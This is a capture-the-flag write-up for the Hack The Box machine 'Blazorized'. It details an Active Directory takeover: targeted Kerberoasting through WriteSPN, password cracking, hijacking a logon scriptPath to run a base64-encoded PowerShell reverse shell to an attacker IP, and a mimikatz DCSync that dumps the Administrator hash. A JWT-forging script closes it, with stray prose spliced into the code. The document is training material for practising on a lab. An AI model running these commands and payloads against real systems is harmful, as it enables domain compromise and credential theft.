curl 10.10.16.11/SharpHound.exe -o SharpHound.exe
PS C:\Users\nu_1055\Desktop> dir
dir


    Directory: C:\Users\nu_1055\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         7/4/2024   5:47 AM        1046528 SharpHound.exe                                                        
-ar---         7/2/2024   8:52 AM             34 user.txt  
```

```bash
PS C:\Users\nu_1055\Desktop> ./SharpHound.exe --CollectionMethods All --
OutputDirectory ./

```

Then we use netuse to transfer files.

Now after importing the zip i see user `nu_1055` node:

In `First Degree Object Control`:

![](images/Pasted%20image%2020240704171109.png)

User  `Nu_1055` has `WriteSPN` to `RSA`. 

![](images/Pasted%20image%2020240704171430.png)


![](images/Pasted%20image%2020240704171631.png)

![](images/Pasted%20image%2020240704171714.png)

Here we get the method lets try it:

We check the Windows abuse as the Linux abuse requires us to have the password for the NU_1055 user which we did not acquire. But the targeted kerberoasting allows us to acquire a silver ticket against the Kerberos server and domain which appears to be encrypted the victim's own NT hash . If the silver ticket (hash) is crackable, then we acquire the victim's password!.

Importing `PowerView.ps1`

```bash
PS C:\Users\nu_1055\Desktop> Invoke-WebRequest http://10.10.16.11:8000/PowerView.ps1 -OutFile PowerView.ps1
```

1- Importing PowerView:

```bash
PS C:\Users\nu_1055\Desktop> Import-Module ./PowerView.ps1 
Import-Module ./PowerView.ps1 

```

2- Make sure that the target account has no SPN

```bash
PS C:\Users\nu_1055\Desktop> Get-DomainUser 'RSA_4810' | Select
serviceprincipalnameGet-DomainUser 'RSA_4810' | Select


logoncount            : 23
badpasswordtime       : 2/1/2024 1:29:42 PM
distinguishedname     : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : RSA_4810
lastlogontimestamp    : 7/2/2024 8:53:54 AM
userprincipalname     : RSA_4810@blazorized.htb
name                  : RSA_4810
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1107
samaccountname        : RSA_4810
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
cn                    : RSA_4810
whenchanged           : 7/2/2024 1:53:54 PM
instancetype          : 4
usncreated            : 24627
objectguid            : ed5f4235-a152-4952-bed0-28ae811ee7f4
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/11/2024 2:13:10 AM, 1/10/2024 6:28:26 PM...}
memberof              : {CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote Management 
                        Users,CN=Builtin,DC=blazorized,DC=htb}
lastlogon             : 2/2/2024 11:44:30 AM
badpwdcount           : 0
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/9/2024 11:37:15 AM
countrycode           : 0
primarygroupid        : 513
pwdlastset            : 2/25/2024 11:55:59 AM
usnchanged            : 340103

```

3 - Set the SPN

```bash
PS C:\Users\nu_1055\Desktop> Set-DomainObject -Identity 'RSA_4810' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

PS C:\users\nu_1055\Documents> Get-DomainUser 'RSA_4810' | Select serviceprincipalname Get-DomainUser 'RSA_4810' | Select serviceprincipalname serviceprincipalname -------------------- nonexistent/BLAHBLAH

```

4- . Get a ST (Silver Ticket) from the user (Rubeus can be used for this step

```bash
PS C:\users\nu_1055\Documents> $toket = Get-DomainUser 'RSA_4810' | GetDomainSPNTicket | fl echo $ticket $toket = Get-DomainUser 'RSA_4810' | Get-DomainSPNTicket | fl PS C:\users\nu_1055\Documents> echo $ticket PS C:\users\nu_1055\Documents> Get-DomainUser 'RSA_4810' | GetDomainSPNTicket | fl Get-DomainUser 'RSA_4810' | Get-DomainSPNTicket | fl


SamAccountName : RSA_4810 DistinguishedName : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb ServicePrincipalName : nonexistent/BLAHBLAH TicketByteHexStream : Hash : $krb5tgs$23$*RSA_4810$blazorized.htb$nonexi


```

Here there is an alternative [SPN-jacking: An Edge Case in WriteSPN Abuse - Semperis](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
which seems more easy.

```bash
PS C:\Users\nu_1055\Desktop> Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='b3rry/ghost'}

PS C:\Users\nu_1055\Desktop> Get-DomainSPNTicket -SPN b3rry/ghost

```

```bash
SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : b3rry/ghost
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$b3rry/ghost*$E4301D043D359EE827E79629E3208094$9A908AF04A1B4CEF54A09
                       3BB7906B65C74596C3687C04DDA93C540EF490DF72D63D64CC71905C2B1F6C84360219D9E3681E4814ABEFFF33554DB1
                       8E119AC85CEE02780A482370F26314BB3DE9D599AB0778F79F0C64B60CEF35EC5114652E5E39940466C8CC42474C490F
                       1635F752C17FC1704293C42A9A3180C0D8BB493E124ED5FB94F1C67643D6E81E7BB21DE8A9B03DD0BB2F6C270C5C2FD4
                       EFF65A6881F32AFD1BEF6C52DE446EF5892FA9B14035DB3A1948F8A26998E4E0CD0945D22DE1C0E10B127C0D4383C66B
                       976096882E16C1C2D46C1DDA8EA171A626AD527DA5D962C6B34592583FEC6D80727D77141F21393C1C73A601796A96E0
                       22596E0B886769BF77149D9A60AC8AAD8AD87CA89759D748824E2FFF6E1BCB99FCA703802145A066E097851780A7DBC7
                       E28C8432FE80648B014DF8CC128F8BF7298EB40458F202748BE5530F55D090EFE03876EB95F95D459599F9B9EFB4FE61
                       081551ABFE0BD7D301BEB25C6192D640408DF8CF9DF6D30021CFEA57553D25CD0D4EE2FA8220678C3B99EC0EF5D7210D
                       8B99865BE417564FE6A8C746A6F49FDB0D3C32F8F770D0EE42ACDBB764395B68A9510FFEE231F533D3788C185BDE5195
                       86275AE652FCA5EC558A0D6213D4A36AAF165EEE515FDC19653C47EF5AF8ECEE175B577DA6E3EC75D7648668AB490673
                       F4B79971A9418BF9B85514B02A2FB1D509C3F5792456C6881F3FF56C2FAF804487FCAE7F839A251F67C6C74AF308AE75
                       B61CCBB07011C25F9F302455299E396B17282882CA5D042289D832F2B18D81ABC9EF55B660AEF22F1B066E5344478437
                       F1E53DCF062D59C6AC548EF7FA1503101DC2FB858BD5E49C0D72064E276A4E4166A3188EC333BC2041C3907861878788
                       71EBBEB2D4683FA21104421A0CA778FF4694F319009BBAA00FD0F3BA9BD3DA7D14DFCF554DD762CB06EBA390F591CF80
                       21065EDC7CEAC1CB0E0BBE4871E452ED7A70AC3FC31B1E6BA4C14C191932FBC183A8761659104FE4DF9ECEE18F04B94E
                       66ADB5FDB218E4B0C510BC23ECB364F15EE7446B212C289DBDE27B085F83303085ACBF67C4EB008F0389D6F061C348FC
                       7C1EB1674EAFEC84A8EAD993EF75B5F0E72823FD26E61ED4239B7DE6598564A6B4A3A4969157AEDED16F7A90A756CCB5
                       8C8C40F4D1658A400D89872CE786141F3A5FA2925FB0503FBB353B4A1EAC34D30872651D4DF1EB8519BD005BD46EF813
                       5F42FB8522FC1074713AC987C27B5E5E370DDC73FE25CE5B12FE452C0566BDAB4991A2BD1AD4A649877F72DA641250E2
                       E02FAEB94B8A753B4135723566BDD03FD65FC3BACC127D7C3B8F9C50A763CF6A04DCF13646C4ABD7E470F637DF7D0B40
                       760972A21EA852CDE9CA79CA5F0C8F03AD46871C361591234DC62899DF75AB9945A2931EF6571AAF1ACA1B2BEAEEF0AF
                       C81BA5B4D31E917E0641FCE9FC47DBDD00C4542412DEACE47F49A1E051B8DE313C76EB7C9BB94FA20984C82F58C16558
                       0C23909A285515E5B93B5B1E6C08A322D0B2563453AEE7C022AED51A692592F80A42468D7EAC9DC0FC03B5943954F6BC
                       5B0EA31141E397D899B84E29EE2B10536F8F807D2D7FE3227BCE483DABF30C523EC19DB507796A474BB7EA534B18DE40
                       3041C500498E27A8CB47D74EC1CA33AB69430A3243DF723AF71EC7B09FB4234E91A167515943467EC546F2495043169A
                       6EADF70F88E32C3EA70FAA8FED57F5CDCA319ABB49BE612BC64BFC6AC7687039A28B211E816B85DF243E0059D84

```

It request a service ticket b3rry/ghost with a non-existent SPN as a virtual name.

Here cracking hash with `hashcat`

```bash
hashcat -m 13100 RSA_4810_hash /usr/share/wordlists/rockyou.txt
```

![](images/Pasted%20image%2020240704175926.png)

We get pass `Ni7856Do9854Ki05Ng0005 #`

We can login to RSA_4810 user:

```bash
evil-winrm -i blazorized.htb -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
```

## Here we can also used `runasCS.exe` binary to log as the user!

```bash
PS C:\users\nu_1055\documents> ./runas.exe rsa_4810 '(Ni7856Do9854Ki05Ng0005 #)' "cmd /c whoami /all" --logon-type 8 ./runas.exe rsa_4810 '(Ni7856Do9854Ki05Ng0005 #)' "cmd /c whoami /all" -- logon-type 8 [*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '8'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type. [*] Warning: The logon for user 'rsa_4810' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token. USER INFORMATION ---------------- User Name SID =================== ============================================= blazorized\rsa_4810 S-1-5-21-2039403211-964143010-2924010611-1107
```

Continue analysing Bloodhound:

![](images/Pasted%20image%2020240704181245.png)

Importing Power View for more info:

```bash
Invoke-WebRequest http://10.10.16.11:8000/PowerView.ps1 -OutFile PowerView.ps1
```

```bash
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> Import-Module ./PowerView.ps1
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> Get-NetUser

```

![](images/Pasted%20image%2020240704182453.png)

```bash
scriptpath            : \\dc1\NETLOGON\A2BFDCF13BB2\B00AC3C11C0E\BAEDDDCD2BCB\C0B3ACE33AEF\2C0A3DFE2030
```

After running `Get-NetUser` a suspicious account discovered here logoncount is not normal and here a `scriptpath` tell us that the script is stored in `NETLOGON` share in `dc1`

## **Script Path exploitation**

Since the path is run each minute, we may be able to replace the contents of the file with our own commands. Now there exists documentation from Microsoft that can assist someone in one of the major ideas surrounding this type of idea: https://learn.microsoft.com/en-us/troubleshoot/windowsserver/user-profiles-and-logon/assign-logon-script-profile-local-user From the above documentation we see the following: ┌──(LDAP)- - └─$ Get-DomainObject -Identity SSA_6010 -Select lastLogon 2024-07-02 11:41:09.083233 [DC1.blazorized.htb] [BLAZORIZED\RSA_4810] 
1. Local logon scripts must be stored in a shared folder that uses the share name of Netlogon, or be stored in sub folders of the Netlogon folder. 
2. If the logon script is stored in a sub folder of the default logon script path, put the relative path to that folder in front of the file name.  For example, if the Startup.bat logon script is stored in \\ComputerName\Netlogon\FolderName, type FolderName\Startup.bat . 
   From those two we can be able to come up with a payload and a correct format for us to try. We change the files because the current files does not seem to produce the changes we want. Now we can refer to a post here for this part: https://community.spiceworks.com/t/basicquestion-sysvol-and-netlogon-folders/269722

![](images/Pasted%20image%2020240704184401.png)
```bash
\\dc1\NETLOGON\ = \\dc1\SYSVOL\Scripts = C:\WINDOWS\SYSVOL\domain\Scripts = C:\Windows\SYSvol\sysvol\blazorized.htb\script
```

Checking if current user has some permission on that file.

![](images/Pasted%20image%2020240704183504.png)

```bash
*Evil-WinRM* PS C:\windows\sysvol\domain\scripts\A2BFDCF13BB2\B00AC3C11C0E\BAEDDDCD2BCB\C0B3ACE33AEF> Get-Acl '2C0A3DFE2030.bat' | Format-List -Property *

```

![](images/Pasted%20image%2020240704183837.png)

Here current user have Write and Allow execute permission .

First:

Import PowerView.ps1:

```bash
Import-Module ./PowerView.ps1

Set-ADUser -Identity SSA_6010 -ScriptPath "A32FF3AEAA23\exploit.bat"
```

We need to create a payload in our machine , here i am using PowerShell-rev payload.

```powershell
$listener = "10.10.16.11" # Attacker's IP address
$lport = 9003 # Attacker's listening port
$client = New-Object System.Net.Sockets.TCPClient($listener, $lport)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i)
 $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
 $sendback2 = $sendback + "PS " + (pwd).Path + "> "
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
 $stream.Write($sendbyte,0,$sendbyte.Length)
 $stream.Flush()
}
$client.Close()
```

```bash
cat rev.ps1 | iconv -t utf-16le | base64 -w 0
JABsAGkAcwB0AGUAbgBlAHIAIAA9ACAAIgAxADAALgAxADAALgAxADYALgAxADEAIgAgACMAIABBAHQAdABhAGMAawBlAHIAJwBzACAASQBQACAAYQBkAGQAcgBlAHMAcwAKACQAbABwAG8AcgB0ACAAPQAgADkAMAAwADMAIAAjACAAQQB0AHQAYQBjAGsAZQByACcAcwAgAGwAaQBzAHQAZQBuAGkAbgBnACAAcABvAHIAdAAKACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAkAGwAaQBzAHQAZQBuAGUAcgAsACAAJABsAHAAbwByAHQAKQAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AAoAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUACgBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkACgAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQAKACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiAAoAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=
```

```bash
encoded_payload=$(cat rev.ps1 | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

echo "powershell -e $encoded_payload" > payload.txt
```

Here our payload.txt is generated

`Now create a powershell.ps1 and add following command named attack.ps1`

```bash
$infile = "C:\users\RSA_4810\documents\payload.txt"
$outfile = "C:\Windows\sysvol\domain\scripts\A32FF3AEAA23\exploit.bat"
$content = [System.IO.File]::ReadAllText($infile, [System.Text.Encoding]::UTF8)
[System.IO.File]::WriteAllText($outfile, $content, [System.Text.Encoding]::ASCII)
```

Now Transfer the files into our machine.

```bash
*Evil-WinRM* PS C:\users\rsa_4810\Documents> upload payload.txt
                                        
Info: Uploading /home/kali/Desktop/HTB/Blazorized/payload.txt to C:\users\rsa_4810\Documents\payload.txt
                                        
Data: 828 bytes of 828 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\users\rsa_4810\Documents> upload attack.ps1
                                        
Info: Uploading /home/kali/Desktop/HTB/Blazorized/attack.ps1 to C:\users\rsa_4810\Documents\attack.ps1
                                        
Data: 380 bytes of 380 bytes copied
                                        
Info: Upload successful!

```

```bash
*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> ./attack.ps1

*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> dir
Directory: C:\Windows\sysvol\domain\scripts\A32FF3AEAA23


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/29/2024   2:34 PM                113EB3B0B2D3
d-----        5/29/2024   2:34 PM                21FDFAAFC1D0
d-----        5/29/2024   2:33 PM                23010E0A1A33
d-----        5/29/2024   2:34 PM                2BECF3DC0B3D
d-----        5/29/2024   2:33 PM                2F3FCC01E0A3
d-----        5/29/2024   2:34 PM                3DACA30B03D1
d-----        5/29/2024   2:34 PM                3EAF2A3E0CED
d-----        5/29/2024   2:34 PM                A3F211DCB11D
d-----        5/29/2024   2:33 PM                AADE1BA2A3E3
d-----        5/29/2024   2:34 PM                AC2210DC311B
d-----        5/29/2024   2:34 PM                B2ACCF2BABFB
d-----        5/29/2024   2:33 PM                BE11A3E0EA13
d-----        5/29/2024   2:33 PM                BFDDF0E1B33E
d-----        5/29/2024   2:34 PM                C20F1322FB3C
d-----        5/29/2024   2:34 PM                CD102CDEFD0E
d-----        5/29/2024   2:34 PM                CED022B22EBA
d-----        5/29/2024   2:33 PM                D0ECECBC1CCF
d-----        5/29/2024   2:33 PM                F1D30FCB0100
d-----        5/29/2024   2:33 PM                FD33C0CE11AC
-a----        5/29/2024   2:33 PM              0 02FCE0D1303F.bat
-a----         7/4/2024  10:25 AM            285 attack.ps1
-a----         7/4/2024  10:26 AM           1675 exploit.bat
-a----         7/4/2024  10:25 AM           1675 payload.txt

```

We can then run the file and check the output.

```bash
C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> cat C:\Windows\sysvol\domain\scripts\A32FF3AEAA23\exploit.bat
powershell -e JABsAGkAcwB0AGUAbgBlAHIAIAA9ACAAIgAxADAALgAxADAALgAxADYALgAxADEAIgAgACMAIABBAHQAdABhAGMAawBlAHIAJwBzACAASQBQACAAYQBkAGQAcgBlAHMAcwAKACQAbABwAG8AcgB0ACAAPQAgADkAMAAwADMAIAAjACAAQQB0AHQAYQBjAGsAZQByACcAcwAgAGwAaQBzAHQAZQBuAGkAbgBnACAAcABvAHIAdAAKACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAkAGwAaQBzAHQAZQBuAGUAcgAsACAAJABsAHAAbwByAHQAKQAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AAoAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUACgBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkACgAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQAKACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiAAoAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=

```

We can then update the scriptpath attribute, changing it to the required path: Ensure you have a listener before executing the command:

```bash
Set-DomainObject -Identity SSA_6010 -Set @{ scriptPath = "A32FF3AEAA23\exploit.bat" }

Get-DomainObject -Identity SSA_6010

```

![](images/Pasted%20image%2020240704221716.png)

Checking our listener shell:

```bash
nc -lvnp 9003 
Listening on 0.0.0.0 9003 Connection received on 10.129.96.152 55397 
whoami 
blazorized\ssa_6010
```
Here we get ssa_6010 shell:

## **blazorized\ssa_6010**

From here the path is simple, we saw we can do a DCSync attack which allows us to impersonate a DC on the domain and hence acquire credentials. We will utilise the mimikatz.exe binary to do the attack:

1. Transfer the binary to the box (https://github.com/ParrotSec/mimikatz)

```bash
PS C:\Users\SSA_6010\Documents> curl 10.10.15.50/mim.exe -o mim.exe 

PS C:\Users\SSA_6010\Documents> ls 

Directory: C:\Users\SSA_6010\Documents Mode LastWriteTime Length Name 
---- ------------- ------ ---- -a---- 
7/2/2024 9:07 AM 1250056 mim.exe```
```
```

2. Run the binary with the DSync method

```bash
./mim.exe 'lsadump::dcsync /domain:blazorized.htb /user:Administrator' ./mim.exe 'lsadump::dcsync /domain:blazorized.htb /user:Administrator' .#####. mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36 
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo) 
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
## \ / ## > http://blog.gentilkiwi.com/mimikatz 
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) 
'#####' > http://pingcastle.com / http://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:blazorized.htb /user:Administrator


[DC] 'blazorized.htb' will be the domain 
[DC]'DC1.blazorized.htb' will be the DC server 
[DC]'Administrator' will be the user account

Object RDN : Administrator 

** SAM ACCOUNT 
** SAM Username : Administrator 
Account Type : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : 
Password last change : 2/25/2024 12:54:43 PM 
Object Security ID : S-1-5-21-2039403211-964143010-2924010611-500 
Object Relative ID : 500 
Credentials: Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3 
ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3

```

We are able to retrieve the hash of the Administrator user: f55ed1465179ba374ec1cad05b34a5f3 .

using evil-winrm to login:

```bash
evil-winrm -i blazorized.htb -u Administrator -H 'f55ed1465179ba374ec1cad05b34a5f3'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blazorized\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type note.txt
If you enjoyed this machine and want to learn more about DACL attacks, check out the 'DACL Attacks I' and 'DACL Attacks II' modules on HTB Academy.

- Pedant
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e9ee17ab9f68c3ee93054d0947ec063b

```

That's all for the box!

We can do further things like using `impacket-secretsdump for extracting password hashes and other credentials from a Windows system, particularly from Active Directory environments.`

```bash
impacket-secretsdump administrator@blazorized.htb -hashes :f55ed1465179ba374ec1cad05b34a5f3 -outputfile secrets-dump
```

![](images/Pasted%20image%2020240704231732.png)

# **Vital key points**

For foothold it required bypassing authentication by forging a JWT. Since the secret was hardcoded into the .dll files and hence we were able to forge the Super Admin JWT's. We did not get the password for the site but we could forge their token.The script could also be written in other languages such as python.

```python

import jwt
import datetime
import pytz # Add this import
class JWT:
 EXPIRATION_DURATION_IN_SECONDS = 60000
 jwt_key = (
 "869780[SNIPPED]d0a"
 )
 superAdminEmailClaimValue = "superadmin@blazorized.htb"
 postsPermissionsClaimValue = "Posts_Get_All"
 categoriesPermissionsClaimValue = "Categories_Get_All"
 superAdminRoleClaimValue = "Super_Admin"
 issuer = "http://api.blazorized.htb"
 apiAudience = "http://api.blazorized.htb"
 adminDashboardAudience = "http://admin.blazorized.htb"
 def get_signing_credentials(self):
 return JWT.jwt_key, "HS512"
From there we used the knowledge of jwt being in the local storage,
After logging in we were able to enumerate the forms and find SQL injection, since its boolean
 def generate_temporary_jwt(self, expiration_duration=100000):
 key, algorithm = self.get_signing_credentials() # Use self here
 claims = {
 "email": JWT.superAdminEmailClaimValue,
 "role": [JWT.postsPermissionsClaimValue,
JWT.categoriesPermissionsClaimValue]
 }
 exp = datetime.datetime.utcnow() +
datetime.timedelta(seconds=expiration_duration)
 token = jwt.encode(
 {"exp": exp, **claims},
 key,
 algorithm=algorithm,
 issuer=JWT.issuer,
 audience=JWT.apiAudience,
 )
 return token
 def generate_super_admin_jwt(self, expiration_duration=100000):
 key, algorithm = self.get_signing_credentials() # Use self here
 claims = {
 
"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress":
JWT.superAdminEmailClaimValue,
 "http://schemas.microsoft.com/ws/2008/06/identity/claims/role":
JWT.superAdminRoleClaimValue,
 "iss": JWT.issuer, # Use JWT here
 "aud": JWT.adminDashboardAudience, # Use JWT here
 "exp": datetime.datetime.now(pytz.utc) +
datetime.timedelta(seconds=expiration_duration)
 }
 token = jwt.encode(
 claims,
 key,
 algorithm=algorithm
 )
 return token
if __name__ == "__main__":
 jwt_instance = JWT() # Create an instance of JWT
 admin_token = jwt_instance.generate_super_admin_jwt() # Call the method
on the instance
 print(f"Super Admin JWT: {admin_token}")

```

From there we used the knowledge of jwt being in the local storage.
